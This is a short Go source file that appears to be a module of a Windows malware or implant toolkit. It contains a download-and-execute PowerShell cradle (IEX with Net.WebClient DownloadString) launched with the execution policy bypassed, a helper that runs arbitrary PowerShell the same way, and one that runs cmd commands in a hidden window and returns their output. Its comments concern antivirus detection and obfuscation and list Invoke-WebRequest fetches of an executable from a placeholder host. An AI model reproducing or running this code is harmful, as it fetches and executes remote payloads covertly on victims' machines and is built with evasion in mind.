package windows

/*
  run powershell commands
    cat -Raw .\whatever.ps1 | iex
    Download file and Run it UrlToPowershell()
      Invoke-WebRequest 'https://&host/file.exe' -OutFile file.exe
      Execute in .bat
      Powershell -Command Invoke-WebRequest 'https://&host/file.exe' -OutFile file.exe
*/
import (
	"fmt"
  "syscall"
	"os/exec"
)


//Detectable in most
func UrlToPowershell(url string, shell string) {
	cmd := fmt.Sprintf(`IEX (New-Object Net.WebClient).DownloadString('%s')`, url)
	binary, _ := exec.LookPath("powershell")
	exec.Command(binary, fmt.Sprintf(`PowerShell -ExecutionPolicy Bypass -NoLogo -NoExit -Command "%s;%s"`, cmd, shell)).Run()
}

func RunPowerShell(cmd string){
  binary, _ := exec.LookPath("powershell")
	exec.Command(binary, fmt.Sprintf(`PowerShell -ExecutionPolicy Bypass -NoLogo -NoExit -Command "%s"`, cmd)).Run()
}

// change the obfuscation to only use syscalll
func RunCMDCommand(cmd string) string {
	CommandWork := exec.Command("cmd", "/C", cmd)
	CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := CommandWork.Output()

	return string(History)
}
